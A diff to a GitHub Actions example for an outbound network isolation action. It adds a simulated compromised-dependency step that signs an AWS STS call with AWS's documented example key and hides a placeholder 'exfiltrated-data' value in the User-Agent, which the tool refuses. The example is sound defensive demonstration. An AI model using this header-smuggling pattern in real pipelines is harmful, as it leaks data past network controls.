@@ -23,10 +23,10 @@ jobs:
           aws-region: us-east-1
 
       # Same command as the audit example, with the rules and the account that
-      # run produced, plus a call signed with a key from outside the step, as a
-      # stolen one would be. It is refused even though the URL rule allows its
-      # host. fail_on_blocked is false only because this example blocks on
-      # purpose; leave it at its default so a real workflow fails on a refusal.
+      # run produced. The dependency's call is refused even though the URL rule
+      # allows its host. fail_on_blocked is false only because this example
+      # blocks on purpose; leave it at its default so a real workflow fails on
+      # a refusal.
       - name: Call AWS with outbound network isolation
         uses: buildcage/isolated-run@4533b0b5f31b7084de488a0d7a46b8917afcbb4d # v2.2.0-rc4
         env:
@@ -51,7 +51,9 @@ jobs:
               aws sts get-caller-identity
             )
 
-            # Refused: aws-key-not-allowed. AWS's documented example key ID,
-            # built at run time so the file holds no key-shaped literal.
+            # Refused: aws-key-not-allowed. A compromised dependency signs a
+            # call with its author's key and carries data out in the
+            # User-Agent. AWS's documented example key ID, built at run time so
+            # the file holds no key-shaped literal.
             env -u AWS_SESSION_TOKEN AWS_ACCESS_KEY_ID="AKIA$(printf IOSFODNN7EXAMPLE)" AWS_SECRET_ACCESS_KEY=example \
-              aws sts get-caller-identity || true
+              AWS_SDK_UA_APP_ID=exfiltrated-data aws sts get-caller-identity || true
